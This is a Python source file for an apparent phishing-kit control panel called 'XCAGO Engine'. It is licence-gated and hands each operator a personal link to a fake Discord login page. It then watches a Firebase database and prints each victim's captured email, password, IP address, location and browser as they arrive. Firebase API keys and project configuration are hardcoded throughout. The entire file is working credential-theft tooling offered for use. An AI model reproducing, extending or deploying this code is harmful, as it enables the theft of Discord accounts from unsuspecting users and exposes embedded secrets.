import pyrebase
import time
import os
from datetime import datetime
from colorama import init, Fore, Style, Back
import requests

init()

def get_location(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}')
        data = response.json()
        if data['status'] == 'success':
            return f"{data['country']}, {data['city']}"
        return "Unknown"
    except:
        return "Unknown"

def initialize_firebase():
    # Main Firebase config (xcago-login)
    config = {
        "apiKey": "AIzaSyCUXd1zE7AHDGiFO1khBFBXILU1Ba2tlMU",
        "authDomain": "xcago-login.firebaseapp.com",
        "databaseURL": "https://xcago-login-default-rtdb.europe-west1.firebasedatabase.app",
        "projectId": "xcago-login",
        "storageBucket": "xcago-login.firebasestorage.app",
        "messagingSenderId": "887538896230",
        "appId": "1:887538896230:web:47945c0377344a402e8ca7"
    }
    
    # License system Firebase config
    license_config = {
        "apiKey": "AIzaSyC9m29ZLARTGljjfKZ__jZdVUrMz6xF1Pc",
        "authDomain": "discord-33368.firebaseapp.com",
        "databaseURL": "https://discord-33368-default-rtdb.firebaseio.com",
        "projectId": "discord-33368",
        "storageBucket": "discord-33368.firebasestorage.app",
        "messagingSenderId": "383003456694",
        "appId": "1:383003456694:web:94614b4bc19a1bc45fe217",
        "measurementId": "G-XHRSCTR47X"
    }
    
    try:
        # Initialize main Firebase
        firebase = pyrebase.initialize_app(config)
        db = firebase.database()
        auth = firebase.auth()
        
        # Initialize license Firebase
        license_firebase = pyrebase.initialize_app(license_config)
        license_auth = license_firebase.auth()
        
        print(f"{Fore.GREEN}[+] Successfully connected to Firebase!{Style.RESET_ALL}")
        return db, auth, license_auth
    except Exception as e:
        print(f"{Fore.RED}[-] Error connecting to Firebase: {e}{Style.RESET_ALL}")
        return None, None, None

def verify_license():
    # License system Firebase config
    license_config = {
        "apiKey": "AIzaSyC9m29ZLARTGljjfKZ__jZdVUrMz6xF1Pc",
        "authDomain": "discord-33368.firebaseapp.com",
        "databaseURL": "https://discord-33368-default-rtdb.firebaseio.com",
        "projectId": "discord-33368",
        "storageBucket": "discord-33368.firebasestorage.app",
        "messagingSenderId": "383003456694",
        "appId": "1:383003456694:web:94614b4bc19a1bc45fe217",
        "measurementId": "G-XHRSCTR47X"
    }
    
    max_attempts = 3
    attempts = 0
    
    while attempts < max_attempts:
        print_banner()
        print(f"{Fore.CYAN}╔═════════════════════════ LICENSE VERIFICATION ═════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║  Enter your license credentials to continue                            ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║  Attempts remaining: {Fore.WHITE}{max_attempts - attempts}{Fore.CYAN}{' ' * 45}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚═════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        email = input(f"{Fore.YELLOW}[?] License Email: {Style.RESET_ALL}").strip()
        password = input(f"{Fore.YELLOW}[?] License Password: {Style.RESET_ALL}").strip()
        
        try:
            # Initialize license Firebase for verification
            license_firebase = pyrebase.initialize_app(license_config)
            license_auth = license_firebase.auth()
            
            # Try to sign in with license credentials
            license_auth.sign_in_with_email_and_password(email, password)
            print(f"{Fore.GREEN}[+] License verified successfully!{Style.RESET_ALL}")
            time.sleep(1)
            return True
            
        except Exception as e:
            print(f"{Fore.RED}[-] Invalid license credentials!{Style.RESET_ALL}")
            attempts += 1
            if attempts < max_attempts:
                print(f"\n{Fore.YELLOW}[!] {max_attempts - attempts} attempts remaining{Style.RESET_ALL}")
                time.sleep(2)
    
    print(f"\n{Fore.RED}[!] Maximum attempts reached. Exiting...{Style.RESET_ALL}")
    time.sleep(2)
    return False

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{Fore.RED}
    ▓█████▄  ██▓  ██████     ██░ ██  █    ██  ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
    ▒██▀ ██▌▓██▒▒██    ▒    ▓██░ ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
    ░██   █▌▒██▒░ ▓██▄      ▒██▀▀██░▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
    ░▓█▄   ▌░██░  ▒   ██▒   ░▓█ ░██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
    ░▒████▓ ░██░▒██████▒▒   ░▓█▒░██▓▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒{Style.RESET_ALL}

{Fore.CYAN}╔═════════════════════════ XCAGO ENGINE ═════════════════════════╗
║  {Fore.RED}[Discord]{Fore.CYAN}  : {Fore.WHITE}https://discord.gg/hfNM8c3EaZ{Fore.CYAN}                   ║
║  {Fore.RED}[Version]{Fore.CYAN}  : 2.1 - Professional Edition                         ║
║  {Fore.RED}[Status]{Fore.CYAN}   : {Fore.GREEN}Active{Fore.CYAN}                                          ║
╚═════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)

def print_auth_menu():
    print(f"""
{Fore.CYAN}╔═════════════════════════ XCAGO LOGIN ═════════════════════════╗
║  1. Login                                                         ║
║  2. Register                                                      ║
║  3. Exit                                                         ║
╚═════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")

def handle_auth(db, auth):
    while True:
        print_banner()
        print_auth_menu()
        choice = input(f"{Fore.YELLOW}[?] Choose an option: {Style.RESET_ALL}")
        
        try:
            if choice == "1":  # Login
                email = input(f"{Fore.YELLOW}[?] Email: {Style.RESET_ALL}")
                password = input(f"{Fore.YELLOW}[?] Password: {Style.RESET_ALL}")
                
                user = auth.sign_in_with_email_and_password(email, password)
                
                
                user_data = db.child("users").child(user['localId']).get().val()
                if not user_data:
                    
                    db.child("users").child(user['localId']).set({
                        "email": email,
                        "created_at": datetime.now().isoformat(),
                        "total_victims": 0,
                        "victims": {}
                    })
                
                print(f"{Fore.GREEN}[+] Successfully logged in!{Style.RESET_ALL}")
                print(f"\n{Fore.CYAN}Your phishing link:{Style.RESET_ALL}")
                print(f"{Fore.WHITE}https://deadcode112.github.io/discord/?uid={user['localId']}{Style.RESET_ALL}\n")
                input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                return user
                
            elif choice == "2":  # Register
                email = input(f"{Fore.YELLOW}[?] Email: {Style.RESET_ALL}")
                password = input(f"{Fore.YELLOW}[?] Password: {Style.RESET_ALL}")
                
                user = auth.create_user_with_email_and_password(email, password)
                
                
                db.child("users").child(user['localId']).set({
                    "email": email,
                    "created_at": datetime.now().isoformat(),
                    "total_victims": 0,
                    "victims": {}
                })
                
                print(f"{Fore.GREEN}[+] Successfully registered!{Style.RESET_ALL}")
                print(f"\n{Fore.CYAN}Your phishing link:{Style.RESET_ALL}")
                print(f"{Fore.WHITE}https://deadcode112.github.io/discord/?uid={user['localId']}{Style.RESET_ALL}\n")
                input(f"{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                return user
                
            elif choice == "3":
                print(f"{Fore.RED}[!] Exiting...{Style.RESET_ALL}")
                exit()
                
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
            time.sleep(2)

def print_user_stats(db, user_id):
    # Get all victims and filter client-side
    victims_ref = db.child("discord_logins").get()
    if victims_ref.val():
        # Filter victims that belong to this user
        user_victims = {k: v for k, v in victims_ref.val().items() if v.get('uid') == user_id}
        total_victims = len(user_victims)
    else:
        total_victims = 0
    
    print(f"{Fore.RED}╔═════════════════════════ USER STATS ═════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.RED}║  Total Victims: {Fore.WHITE}{total_victims}{' ' * (42 - len(str(total_victims)))}{Fore.RED}║{Style.RESET_ALL}")
    print(f"{Fore.RED}║  Your Phishing Link:{' ' * 46}║{Style.RESET_ALL}")
    print(f"{Fore.RED}║  {Fore.WHITE}https://deadcode112.github.io/discord/?uid={user_id}{' ' * (20 - len(user_id))}{Fore.RED}║{Style.RESET_ALL}")
    print(f"{Fore.RED}╚═════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")

def check_database(db, user_id):
    print(f"\n{Fore.YELLOW}[*] Checking database...{Style.RESET_ALL}")
    
    try:
        # Check user data
        user_data = db.child("users").child(user_id).get().val()
        print(f"\n{Fore.CYAN}[*] User data:{Style.RESET_ALL}")
        print(user_data)
        
        # Check victims
        victims = db.child("users").child(user_id).child("victims").get().val()
        print(f"\n{Fore.CYAN}[*] Victims data:{Style.RESET_ALL}")
        print(victims)
        
        return True
    except Exception as e:
        print(f"{Fore.RED}[-] Database error: {e}{Style.RESET_ALL}")
        return False

def monitor_user_victims(db, user_id):
    last_data = {}
    print_banner()
    print_user_stats(db, user_id)
    
    while True:
        try:
            current_time = datetime.now().strftime('%H:%M:%S')
            print(f"\r{Fore.BLUE}[{current_time}] Monitoring victims... {Style.RESET_ALL}", end='')
            
            # Get all victims and filter client-side
            victims_ref = db.child("discord_logins").get()
            
            if victims_ref and victims_ref.val():
                # Filter for victims captured by this user
                current_data = {k: v for k, v in victims_ref.val().items() 
                              if v.get('uid') == user_id}
                
                new_items = {k: v for k, v in current_data.items() 
                           if k not in last_data}
                
                if new_items:
                    print_banner()
                    print_user_stats(db, user_id)
                    
                    for key, value in new_items.items():
                        print(f"\n{Fore.RED}[!] New victim detected!{Style.RESET_ALL}")
                        print(f"{Fore.RED}══════════════════════════════════════════════════{Style.RESET_ALL}")
                        print(f"{Fore.YELLOW}[+] Email    : {Fore.WHITE}{value.get('email', 'N/A')}")
                        print(f"{Fore.YELLOW}[+] Password : {Fore.WHITE}{value.get('password', 'N/A')}")
                        print(f"{Fore.YELLOW}[+] IP       : {Fore.WHITE}{value.get('ip', 'N/A')}")
                        location = get_location(value.get('ip', ''))
                        print(f"{Fore.YELLOW}[+] Location : {Fore.WHITE}{location}")
                        print(f"{Fore.YELLOW}[+] Browser  : {Fore.WHITE}{value.get('userAgent', 'N/A')}")
                        print(f"{Fore.YELLOW}[+] Time     : {Fore.WHITE}{value.get('timestamp', 'N/A')}")
                        print(f"{Fore.RED}══════════════════════════════════════════════════{Style.RESET_ALL}")
                
                last_data = current_data
            
            time.sleep(1)
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Monitoring stopped.{Style.RESET_ALL}")
            break
        except Exception as e:
            print(f"\n{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
            time.sleep(2)

if __name__ == "__main__":
    
    if not verify_license():
        exit(1)
    
    # Then initialize main Firebase and continue
    db, auth, _ = initialize_firebase()
    if not db or not auth:
        print(f"{Fore.RED}[!] Failed to initialize Firebase. Exiting...{Style.RESET_ALL}")
        exit(1)
    
    # Continue with normal authentication
    user = handle_auth(db, auth)
    if user:
        monitor_user_victims(db, user['localId'])